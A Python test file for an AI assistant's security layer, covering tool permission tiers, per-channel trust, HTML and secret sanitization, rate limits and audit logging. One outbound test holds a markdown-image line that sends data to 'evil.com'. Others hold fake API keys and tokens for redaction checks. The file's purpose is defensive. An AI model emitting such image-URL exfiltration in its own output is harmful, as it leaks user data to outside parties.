"""Tests for aifred.lib.security — tier filtering, sanitization, audit, rate limiting."""

import json
import os
import sqlite3
import tempfile
from pathlib import Path
from unittest.mock import patch

import pytest

from aifred.lib.security import (
    TIER_ADMIN,
    TIER_COMMUNICATE,
    TIER_READONLY,
    TIER_WRITE_DATA,
    TIER_WRITE_SYSTEM,
    OWNER_TIER,
    DEFAULT_TIER_BY_SOURCE,
    RateLimitReached,
    _RateTracker,
    audit_log,
    check_rate_limit,
    filter_tools_by_tier,
    needs_confirmation,
    resolve_tier_for_sender,
    sanitize_inbound,
    sanitize_outbound,
    sanitize_tool_output,
    wrap_external_message,
)
from aifred.lib.function_calling import Tool


# ── Helpers ───────────────────────────────────────────────────

def _make_tool(name: str, tier: int) -> Tool:
    return Tool(name=name, description="test", parameters={}, executor=lambda: None, tier=tier)


# ── Tier Constants ────────────────────────────────────────────

class TestTierConstants:
    def test_tier_ordering(self):
        assert TIER_READONLY < TIER_COMMUNICATE < TIER_WRITE_DATA < TIER_WRITE_SYSTEM < TIER_ADMIN

    def test_tier_values(self):
        assert TIER_READONLY == 0
        assert TIER_COMMUNICATE == 1
        assert TIER_WRITE_DATA == 2
        assert TIER_WRITE_SYSTEM == 3
        assert TIER_ADMIN == 4


# ── Tier Filtering ────────────────────────────────────────────

class TestFilterToolsByTier:
    def test_filter_readonly(self):
        tools = [
            _make_tool("calc", TIER_READONLY),
            _make_tool("email", TIER_COMMUNICATE),
            _make_tool("epim_create", TIER_WRITE_DATA),
        ]
        result = filter_tools_by_tier(tools, TIER_READONLY)
        assert [t.name for t in result] == ["calc"]

    def test_filter_communicate(self):
        tools = [
            _make_tool("calc", TIER_READONLY),
            _make_tool("email", TIER_COMMUNICATE),
            _make_tool("epim_create", TIER_WRITE_DATA),
        ]
        result = filter_tools_by_tier(tools, TIER_COMMUNICATE)
        assert [t.name for t in result] == ["calc", "email"]

    def test_filter_admin_allows_all(self):
        tools = [
            _make_tool("calc", TIER_READONLY),
            _make_tool("shell", TIER_ADMIN),
        ]
        result = filter_tools_by_tier(tools, TIER_ADMIN)
        assert len(result) == 2

    def test_filter_empty_list(self):
        assert filter_tools_by_tier([], TIER_ADMIN) == []

    def test_default_tiers_by_source(self):
        """Browser should allow everything, external channels should restrict."""
        assert DEFAULT_TIER_BY_SOURCE["browser"] == TIER_ADMIN
        assert DEFAULT_TIER_BY_SOURCE["email"] == TIER_COMMUNICATE
        assert DEFAULT_TIER_BY_SOURCE["discord"] == TIER_COMMUNICATE
        assert DEFAULT_TIER_BY_SOURCE["webhook"] == TIER_READONLY


# ── Inbound Sanitization ─────────────────────────────────────

class TestSanitizeInbound:
    def test_strip_html(self):
        assert sanitize_inbound("<b>Hello</b> <script>evil</script>world") == "Hello evilworld"

    def test_strip_zero_width_chars(self):
        text = "Hello\u200bWorld\u200c!\ufeff"
        assert sanitize_inbound(text) == "HelloWorld!"

    def test_nfc_normalization(self):
        # é as combining (e + combining accent) vs precomposed
        combining = "e\u0301"  # e + combining acute
        result = sanitize_inbound(combining)
        assert result == "\u00e9"  # precomposed é

    def test_plain_text_passthrough(self):
        text = "Just normal text with numbers 123"
        assert sanitize_inbound(text) == text

    def test_empty_string(self):
        assert sanitize_inbound("") == ""


class TestWrapExternalMessage:
    def test_basic_wrapping(self):
        result = wrap_external_message("Hello", "user@mail.de", "email", "external")
        assert '<external_message sender="user@mail.de"' in result
        assert 'channel="email"' in result
        assert 'trust="external"' in result
        assert "Hello" in result
        assert "</external_message>" in result


# ── Outbound Sanitization ────────────────────────────────────

class TestSanitizeOutbound:
    def test_block_markdown_images(self):
        text = "Here: ![secret](https://evil.com/steal?data=abc123)"
        result = sanitize_outbound(text)
        assert "evil.com" not in result
        assert "[image blocked by security policy]" in result

    def test_preserve_non_image_links(self):
        text = "Check [this link](https://example.com)"
        result = sanitize_outbound(text)
        assert "example.com" in result

    def test_redact_openai_key(self):
        text = "Key: sk-proj-abcdefghijklmnopqrstuvwxyz1234567890"
        result = sanitize_outbound(text)
        assert "sk-proj-" not in result
        assert "[REDACTED]" in result

    def test_redact_github_pat(self):
        text = "Token: ghp_1234567890abcdefghijklmnopqrstuvwxyz1234"
        result = sanitize_outbound(text)
        assert "ghp_" not in result

    def test_redact_aws_key(self):
        text = "AWS: AKIAIOSFODNN7EXAMPLE"
        result = sanitize_outbound(text)
        assert "AKIA" not in result

    def test_redact_bearer_token(self):
        text = "Auth: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0"
        result = sanitize_outbound(text)
        assert "eyJhbGciOi" not in result

    def test_normal_text_passthrough(self):
        text = "This is a normal response with no secrets."
        assert sanitize_outbound(text) == text


class TestSanitizeToolOutput:
    def test_redact_secrets_in_tool_output(self):
        output = '{"error": "Auth failed with key sk-abcdefghijklmnopqrstuvwxyz"}'
        result = sanitize_tool_output(output)
        assert "sk-" not in result
        assert "[REDACTED]" in result

    def test_normal_output_passthrough(self):
        output = '{"result": "42"}'
        assert sanitize_tool_output(output) == output


# ── Rule of Two ───────────────────────────────────────────────

class TestNeedsConfirmation:
    def test_browser_never_needs_confirmation(self):
        assert needs_confirmation("browser", TIER_ADMIN) is False
        assert needs_confirmation("browser", TIER_WRITE_DATA) is False

    def test_external_readonly_ok(self):
        assert needs_confirmation("email", TIER_READONLY) is False
        assert needs_confirmation("discord", TIER_COMMUNICATE) is False

    def test_external_write_blocked_without_override(self):
        assert needs_confirmation("email", TIER_WRITE_DATA) is True
        assert needs_confirmation("discord", TIER_WRITE_SYSTEM) is True
        assert needs_confirmation("telegram", TIER_ADMIN) is True

    def test_cron_write_blocked(self):
        assert needs_confirmation("cron", TIER_WRITE_DATA) is True

    def test_webhook_write_blocked(self):
        assert needs_confirmation("webhook", TIER_WRITE_DATA) is True

    def test_owner_override_allows_write(self):
        """When max_tier >= tool_tier, the tool was explicitly allowed."""
        assert needs_confirmation("telegram", TIER_WRITE_DATA, max_tier=TIER_WRITE_DATA) is False
        assert needs_confirmation("email", TIER_WRITE_DATA, max_tier=TIER_WRITE_DATA) is False

    def test_owner_override_still_blocks_above_tier(self):
        """Tools above the resolved max_tier are still blocked."""
        assert needs_confirmation("telegram", TIER_WRITE_SYSTEM, max_tier=TIER_WRITE_DATA) is True


# ── Sender Tier Override ──────────────────────────────────────

class TestResolveTierForSender:
    def test_browser_always_admin(self):
        assert resolve_tier_for_sender("browser", "anyone") == TIER_ADMIN

    def test_unknown_channel_gets_communicate(self):
        assert resolve_tier_for_sender("unknown_channel", "user") == TIER_COMMUNICATE

    def test_telegram_non_owner_gets_default(self):
        with patch.dict(os.environ, {"TELEGRAM_ALLOWED_USERS": "111, 222"}):
            # User 333 is not the owner (first in list)
            assert resolve_tier_for_sender("telegram", "SomeName", {"user_id": 333}) == TIER_COMMUNICATE

    def test_telegram_owner_gets_elevated(self):
        with patch.dict(os.environ, {"TELEGRAM_ALLOWED_USERS": "111, 222"}):
            # User 111 is the owner (first in list)
            tier = resolve_tier_for_sender("telegram", "OwnerName", {"user_id": 111})
            assert tier == OWNER_TIER

    def test_email_owner_gets_elevated(self):
        # Mock load_settings so user-configured channel_security_tiers don't
        # interfere with the test (the real settings.json may have a higher
        # email tier configured by the user).
        with patch.dict(os.environ, {"EMAIL_ALLOWED_SENDERS": "owner@mail.de, friend@mail.de"}), \
             patch("aifred.lib.settings.load_settings", return_value={}):
            tier = resolve_tier_for_sender("email", '"Owner" <owner@mail.de>')
            assert tier == OWNER_TIER

    def test_email_non_owner_gets_default(self):
        with patch.dict(os.environ, {"EMAIL_ALLOWED_SENDERS": "owner@mail.de, friend@mail.de"}), \
             patch("aifred.lib.settings.load_settings", return_value={}):
            tier = resolve_tier_for_sender("email", '"Friend" <friend@mail.de>')
            assert tier == TIER_COMMUNICATE

    def test_empty_whitelist_no_owner(self):
        with patch.dict(os.environ, {"TELEGRAM_ALLOWED_USERS": ""}):
            assert resolve_tier_for_sender("telegram", "Anyone", {"user_id": 111}) == TIER_COMMUNICATE

    def test_star_whitelist_no_owner(self):
        with patch.dict(os.environ, {"TELEGRAM_ALLOWED_USERS": "*"}):
            assert resolve_tier_for_sender("telegram", "Anyone", {"user_id": 111}) == TIER_COMMUNICATE


# ── Rate Limiting ─────────────────────────────────────────────

class TestRateTracker:
    def test_unlimited_source(self):
        tracker = _RateTracker()
        # Browser has limit=0 (unlimited)
        for _ in range(100):
            assert tracker.record_and_check("browser", 1000.0) is True

    def test_rate_exceeded(self):
        tracker = _RateTracker()
        now = 1000.0
        # Email limit is 5 per 60s
        for i in range(5):
            assert tracker.record_and_check("email", now + i) is True
        # 6th should fail
        assert tracker.record_and_check("email", now + 5) is False

    def test_rate_resets_after_window(self):
        tracker = _RateTracker()
        now = 1000.0
        for i in range(5):
            tracker.record_and_check("email", now + i)
        # After 61 seconds, should be OK again
        assert tracker.record_and_check("email", now + 61) is True


# ── Circuit Breaker ───────────────────────────────────────────

class TestCircuitBreaker:
    def test_breaker_not_tripped_initially(self):
        tracker = _RateTracker()
        assert tracker.is_tripped("email", 1000.0) is False

    def test_breaker_trips_after_repeated_violations(self):
        tracker = _RateTracker()
        now = 1000.0
        # Trigger rate limit violations 3 times (threshold)
        for violation in range(3):
            # Fill up the rate limit
            for i in range(6):
                tracker.record_and_check("email", now + violation * 10 + i)

        # Should now be tripped
        assert tracker.is_tripped("email", now + 30) is True

    def test_breaker_resets_after_cooldown(self):
        tracker = _RateTracker()
        now = 1000.0
        # Trip the breaker
        for violation in range(3):
            for i in range(6):
                tracker.record_and_check("email", now + violation * 10 + i)

        assert tracker.is_tripped("email", now + 30) is True
        # After cooldown (300s), should reset
        assert tracker.is_tripped("email", now + 331) is False

    def test_breaker_does_not_affect_other_channels(self):
        tracker = _RateTracker()
        now = 1000.0
        # Trip email breaker
        for violation in range(3):
            for i in range(6):
                tracker.record_and_check("email", now + violation * 10 + i)

        assert tracker.is_tripped("email", now + 30) is True
        assert tracker.is_tripped("telegram", now + 30) is False


# ── Audit Log ─────────────────────────────────────────────────

class TestAuditLog:
    def test_audit_log_writes(self):
        with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as f:
            db_path = Path(f.name)

        # Patch the db path
        import aifred.lib.security as sec
        sec._audit_db_path = db_path
        sec._audit_db_initialized = False

        try:
            audit_log(
                session_id="test_session",
                source="browser",
                tool_name="calculate",
                tool_tier=0,
                tool_args_preview='{"expr": "2+2"}',
                result_preview='{"result": 4}',
                success=True,
                duration_ms=1.5,
            )

            # Verify
            conn = sqlite3.connect(str(db_path))
            rows = conn.execute("SELECT * FROM tool_audit").fetchall()
            conn.close()
            assert len(rows) == 1
            assert rows[0][3] == "browser"  # source
            assert rows[0][4] == "calculate"  # tool_name
        finally:
            db_path.unlink(missing_ok=True)
            sec._audit_db_path = None
            sec._audit_db_initialized = False
